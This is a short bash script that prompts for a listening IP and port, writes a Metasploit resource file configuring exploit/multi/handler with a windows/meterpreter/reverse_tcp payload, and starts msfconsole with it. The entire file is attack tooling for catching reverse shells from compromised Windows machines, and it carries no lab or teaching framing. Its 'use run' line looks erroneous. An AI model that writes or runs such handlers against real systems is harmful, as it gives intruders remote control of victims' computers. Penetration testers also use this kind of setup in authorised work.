#!/bin/bash

# Prompt user for LHOST and LPORT
read -p "Enter LHOST (your IP address): " LHOST
read -p "Enter LPORT (listening port): " LPORT

# Create a Metasploit resource file dynamically
cat > handler.rc <<EOF
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
use run
EOF

# Run msf6 with the resource file
#msfconsole
msfconsole -r handler.rc
